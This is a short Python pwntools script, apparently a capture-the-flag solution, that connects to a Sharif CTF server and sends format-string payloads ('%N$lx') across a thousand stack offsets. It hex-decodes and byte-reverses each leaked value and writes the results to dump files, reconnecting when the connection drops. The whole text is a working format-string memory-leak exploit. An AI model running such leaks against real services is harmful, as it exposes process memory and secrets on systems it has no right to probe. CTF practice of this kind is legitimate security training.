from pwn import *

dump=open('dump','w')
dump1=open('dump1','w')
r=remote('ctf.sharif.edu',54514)

for i in range(1,1000):
  try :
    payload="%"+str(i)+"$lx"
    r.sendline(payload)
    msg=r.recvline()
    msg=r.recvline()
    print "[+] trying with index"+str(i)+" "+msg
    #context.bits=len(msg)*8
    msg = msg.strip().decode('hex')
    msg = msg[::-1]
    print msg
    dump.write(msg)
    dump1.write(str(i)+" "+msg)
    dump1.write('\n')
  except EOFError :
    print "[+] no luck here !!"
    i=i-1
    r=remote('ctf.sharif.edu',54517)
